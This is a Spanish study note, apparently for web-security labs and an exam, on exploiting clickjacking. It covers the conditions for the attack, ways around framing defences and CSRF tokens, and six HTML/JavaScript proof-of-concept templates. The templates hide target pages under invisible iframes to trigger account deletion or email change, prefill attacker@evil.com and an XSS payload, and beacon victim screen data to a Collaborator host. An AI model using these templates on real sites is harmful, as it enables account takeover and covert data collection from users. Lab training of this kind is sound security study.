---
aliases:
  - Clickjacking
  - clickjacking-entrypoint
  - UI redress
tags:
  - vuln/clickjacking
  - entrypoint
---

# Clickjacking (UI redressing) — Punto de entrada

> Documento **agnóstico al negocio**: responde *cómo **explotar** un clickjacking*.
> **Dónde** aplica en el target (qué acción hacer clickear) → eso vive en los `STAGE_x` (recon del negocio).

## 📚 Referencias rápidas

- 🧪 **Laboratorios** — 5 labs (Apprentice + Practitioner), orden oficial + foco de cada uno: [labs/README.md](labs/README.md)
- 📎 **Ejemplos resueltos (HTML real, calibrado):** [[vulnerabilities/004-clickjacking/examples/prefill-email-grid-overlay|prefill email + grilla]] · [[vulnerabilities/004-clickjacking/examples/multistep-delete-account|multistep delete]]
- 🧰 **Método de entrega:** el **exploit server** integrado (guardás el HTML, *View exploit* para alinear, *Deliver exploit to victim* para que la víctima lo visite y haga clic). No hay generador automático de Burp para clickjacking.
- 🔗 Se **combina** con [[vulnerabilities/003-csrf/csrf|CSRF]] (sirve **aunque haya token**) y con [[vulnerabilities/002-xss/README|XSS]] (gatilla un DOM XSS que necesita clic).

## 🎯 Condiciones para que exista clickjacking (la FLAG real)

Clickjacking requiere **las tres** a la vez:

1. **Acción relevante disparada por un clic** → un botón/flujo con estado: `Delete account`, `Update email`, `Submit feedback`, aprobar algo… **Esta es la FLAG por defecto: que exista una acción relevante y clickeable.** Sin algo que valga la pena que la víctima "clickee a ciegas", no hay clickjacking útil.
2. **La página se puede enmarcar** → **faltan** `X-Frame-Options: deny/sameorigin` **y** CSP `frame-ancestors 'self'/'none'`. Si cualquiera de esas cabeceras está bien puesta, el `<iframe>` no carga → descartado.
3. **La acción se autoriza solo con la cookie de sesión** — como en CSRF, la víctima está **logueada** y el navegador manda su cookie sola dentro del iframe. El clic ejecuta la acción **en su sesión**.

> [!danger] 🚩 ¿Está o no está?
> Las preguntas correctas son: **(a) ¿hay una acción relevante que se dispare con un clic?** y **(b) ¿la página se deja enmarcar** (sin `X-Frame-Options` ni CSP `frame-ancestors`)? Si las dos son "sí" → hay clickjacking, **aunque el form tenga token CSRF** (el token no protege acá). Si la página **no** se puede enmarcar → descartá clickjacking. La ausencia/presencia de esas cabeceras la ves en la **response** del target en Burp.

## 🧪 Cómo explotar (metodología)

1. **Identificá la acción relevante** (delete account / change email / submit) y **confirmá que la página se enmarca** → mirá la response: ¿tiene `X-Frame-Options` o `Content-Security-Policy: frame-ancestors`? Si no → seguí.
2. **Montá el target en un `<iframe>`** en tu exploit server, a pantalla completa (`width/height = 100vw/100vh`).
3. **Alineá con `opacity: 0.1`** para ver el botón real; posicioná un `<div>` **señuelo** clickeable (mayor `z-index`) **justo encima** del botón. Ajustá `top`/`left` del iframe hasta que el botón quede bajo tu señuelo. **Si no sabés la resolución de la víctima** → mandá un **beacon** con su layout al Collaborator/exploit server y recalculá los offsets (PoC #6).
4. **Si el form necesita datos** (email, feedback) → **prellenalos por query params** en el `src` del iframe (`?email=attacker@evil.com`).
5. **Sortéa el twist** si lo hay: frame buster → `sandbox="allow-forms"`; multistep → varios señuelos.
6. **Bajá la `opacity` a ~`0.0001`** y **entregá** por el exploit server. Verificá el impacto (email cambiado / cuenta borrada / XSS disparado).

> [!tip] 🏷️ ¿Qué texto/nombre ponerle a los elementos? (la duda típica)
> Hay **dos** textos distintos, no los confundas:
> - **El señuelo que escribís vos** → es **arbitrario**, lo elegís para que la víctima clickee ahí. En los labs oficiales es literalmente **`Test me`** (1 clic) o **`Click me first`** / **`Click me next`** (multistep). Podés poner cualquier cosa; lo único que importa es **dónde** cae, no qué dice.
> - **El botón real del target** (lo que queda **debajo** y de verdad ejecuta la acción) → **ese sí** tiene un label fijo, pero **no lo adivinás: lo leés**. En el examen **registrás tu propia cuenta**, navegás el target y ves el **texto exacto** del botón y **si el flujo pide confirmación** (orden de clics). Después replicás esa alineación contra la víctima.
> - **Labels reales vistos en los labs** (candidatos a probar/buscar en el target): **`Delete account`** (+ confirmación **`Yes`**), **`Update email`**, **`Submit feedback`**. El orden multistep típico es **botón de acción → `Yes`**.

## 🚚 Método de entrega (y diferencia con CSRF)

- **El vector es siempre el exploit server**: la víctima **visita tu página** y **hace un clic** creyendo que interactúa con tu contenido. **No es silencioso** — clickjacking **necesita interacción** de la víctima (a diferencia de CSRF, que se dispara solo).
- **Por eso sirve cuando hay token CSRF:** en clickjacking la víctima envía el **form real** (con su token válido incluido). El token frena un CSRF forjado, pero **no** un clic legítimo de la propia víctima sobre su form.
- **En el examen:** confirmá con el **Access log** del exploit server que una **IP distinta** (la víctima simulada) visitó tu página. Mismo criterio que para CSRF/XSS entregados → [[exam/STAGE_2/STAGE_2#Cross-Site Request Forgery (CSRF)|señal de víctima (Access log)]].

## 🔎 Twists a sortear (defensas del form)

> Rara vez la defensa es una cabecera (si lo fuera, no habría ataque). Suele ser un **twist del propio form**:

<table>
<tr><th>Twist</th><th>Cómo detectarlo</th><th>Cómo sortearlo</th></tr>
<tr><td><b>Token CSRF en el form</b></td><td>Hay un input <code>csrf</code> hidden en el form del target</td><td><b>Ignoralo.</b> La víctima manda el form real con su token → el clickjacking funciona igual. El token no defiende de esto.</td></tr>
<tr><td><b>El form necesita datos</b> (email, comentario)</td><td>El input está vacío y no lo controlás</td><td><b>Prellenalo por query param</b> en el <code>src</code> del iframe (<code>?email=<mark>attacker@evil.com</mark></code>). La víctima solo aporta el clic.</td></tr>
<tr><td><b>Frame buster script</b></td><td>Al enmarcar, la página "salta" fuera del iframe (<code>top.location = self.location</code>)</td><td><b><code>sandbox="allow-forms"</code></b> en el iframe (sin <code>allow-scripts</code> ni <code>allow-top-navigation</code>) → el script no corre o no puede navegar el top, pero el form sí se envía.</td></tr>
<tr><td><b>Acción multistep</b> (confirmación)</td><td>Borrar/confirmar pide dos clics (botón + "Yes")</td><td><b>Varios señuelos</b> alineados a cada botón del flujo ("Click me first" / "Click me next").</td></tr>
<tr><td><b>Necesita un clic para un DOM XSS</b></td><td>Hay un sink DOM que solo dispara al enviar el form</td><td>Prellená el payload por query params + señuelo sobre <i>Submit</i> → el clic a ciegas ejecuta el XSS.</td></tr>
</table>

> [!note] 🍪 SameSite y clickjacking
> Como la víctima interactúa con el **form real dentro del iframe** (mismo sitio, top-level respecto de su sesión), las restricciones **SameSite** de la cookie **no** suelen frenar el ataque igual que a un CSRF cross-site. La barrera real es **poder enmarcar** la página, no el SameSite.

## 🐍 PoCs (plantillas)

> En todas, lo <mark>resaltado</mark> es lo que reemplazás: la URL del **target** (la del iframe) y la del **exploit server** (para beacons). Alineá con `opacity: 0.1` y bajala a `0.0001` para entregar.

### 1) Overlay base — un señuelo sobre un botón

<pre><code>&lt;style&gt;
  iframe { position:absolute; top:0; left:0; width:100vw; height:100vh;
           border:none; opacity:0.1; z-index:2; }         /* 0.0001 al entregar */
  .decoy { position:absolute; z-index:1; background:rgba(0,0,0,.2);
           padding:10px 20px; font:20px Arial; cursor:pointer; }
&lt;/style&gt;
&lt;div class="decoy" style="top:<mark>510</mark>px; left:<mark>60</mark>px"&gt;Click me&lt;/div&gt;
&lt;iframe src="https://<mark>TARGET</mark>/my-account"&gt;&lt;/iframe&gt;</code></pre>

*Ajustá `top`/`left` del `.decoy` (o `top`/`left` del iframe) hasta tapar el botón real. Recordá que el `z-index` del señuelo debe ser **menor** que el del iframe si querés que el clic pase al iframe — en la práctica se usa iframe con `opacity` baja **por encima** y el texto señuelo debajo; probá ambas alineaciones en `View exploit`.*

### 2) Prellenar el form por query param (change email)

<pre><code>&lt;iframe src="https://<mark>TARGET</mark>/my-account?email=<mark>attacker@evil.com</mark>"
        sandbox="allow-top-navigation allow-forms" id="target"&gt;&lt;/iframe&gt;</code></pre>

### 3) Anti-frame-buster con `sandbox`

<pre><code>&lt;!-- sin allow-scripts → el frame buster no corre; allow-forms deja enviar --&gt;
&lt;iframe src="https://<mark>TARGET</mark>/my-account?email=<mark>attacker@evil.com</mark>"
        sandbox="allow-forms"&gt;&lt;/iframe&gt;</code></pre>

### 4) Multistep (dos señuelos)

<pre><code>&lt;style&gt;
  html,body{margin:0;width:100%;height:100%;overflow:hidden}
  .overlay{position:absolute;z-index:1;padding:10px 20px;background:rgba(0,0,0,.2);
           font:20px Arial;color:#000;cursor:pointer}
  iframe{position:absolute;top:0;left:0;width:100vw;height:100vh;border:none;opacity:.1;z-index:2}
&lt;/style&gt;
&lt;script&gt;
  function addText(t,x,y){const e=document.createElement("div");
    e.className="overlay";e.textContent=t;e.style.left=x+"px";e.style.top=y+"px";
    document.body.appendChild(e);}
  addText("Click me first", <mark>10</mark>, <mark>490</mark>);   // sobre "Delete account"
  addText("Click me next",  <mark>170</mark>, <mark>290</mark>);  // sobre "Yes"/confirm
&lt;/script&gt;
&lt;iframe src="https://<mark>TARGET</mark>/my-account"&gt;&lt;/iframe&gt;</code></pre>

### 5) Clickjacking → DOM XSS (prellenar payload + señuelo sobre *Submit*)

<pre><code>&lt;iframe src="https://<mark>TARGET</mark>/feedback?name=x&amp;email=<mark>hacker@evil.com</mark>&amp;subject=x&amp;message=&lt;img src=1 onerror=print()&gt;"&gt;&lt;/iframe&gt;
&lt;div class="decoy" style="top:<mark>...</mark>px;left:<mark>...</mark>px"&gt;Click me&lt;/div&gt;</code></pre>

### 6) Beacon de resolución/layout (para alinear a ciegas)

**El problema:** vos alineás el señuelo con **tu** pantalla, pero la víctima puede tener **otra resolución/viewport** → el botón real se corre y el clic falla. **La ayuda:** exfiltrá el layout de la víctima con un `<img>` (una request GET sirve para llevar datos en la query) al **Collaborator** o al **exploit server**, leé los valores y **recalculá los `top`/`left`** antes de reentregar.

<pre><code>&lt;script&gt;
(function () {
  const d = {
    sw: screen.width,  sh: screen.height,        // resolución física
    aw: screen.availWidth, ah: screen.availHeight,// área usable (sin barra de tareas)
    vw: window.innerWidth, vh: window.innerHeight,// viewport real del iframe host
    dpr: window.devicePixelRatio || 1            // zoom / densidad
  };
  const qs = Object.entries(d).map(([k,v]) =&gt; k+"="+encodeURIComponent(v)).join("&amp;");
  // Collaborator (exfil puro) …
  new Image().src = "https://<mark>BURP-COLLABORATOR</mark>/cj?" + qs;
  // … o exploit server (lo leés directo en su Access log):
  // new Image().src = "https://<mark>EXPLOIT</mark>/exploit?" + qs;
})();
&lt;/script&gt;</code></pre>

> [!tip] 📐 Flujo de posicionamiento con el beacon
> 1. **Entregá una primera versión** del exploit con el beacon puesto (el iframe puede ir con `opacity:0.1` mientras calibrás).
> 2. **Leé los datos** de la víctima: en el **Collaborator** (pestaña de interacciones, mirás la query de la request HTTP) o en el **Access log** del exploit server.
> 3. **Recalculá `top`/`left`** del señuelo para *esa* resolución (o hacelo **dinámico**: posicioná el `.decoy` con JS en función de `window.innerWidth/Height` para que se ajuste solo en el navegador de la víctima).
> 4. **Reentregá** con `opacity:0.0001`. El **`dpr`** te avisa si hay zoom (los offsets se escalan por ese factor).

> [!note] Beacon dinámico (autoajuste, sin reentregar)
> En vez de recalcular a mano, podés **posicionar el señuelo por proporción** en el propio navegador de la víctima: p. ej. `decoy.style.left = (innerWidth * 0.28) + "px"`. Así el offset se adapta a cualquier resolución y el beacon queda solo como **confirmación**.

---

> [!note] Relación con CSRF y XSS
> - **vs [[vulnerabilities/003-csrf/csrf|CSRF]]:** si el form tiene **token bien atado** y no hay bypass de CSRF puro, **clickjacking es la salida** (la víctima manda el form real con su token). A cambio, exige un **clic** de la víctima.
> - **con [[vulnerabilities/002-xss/README|XSS]]:** si hay un **DOM XSS** que solo dispara al enviar un form, el clickjacking provee la **interacción** que lo activa (lab 4).
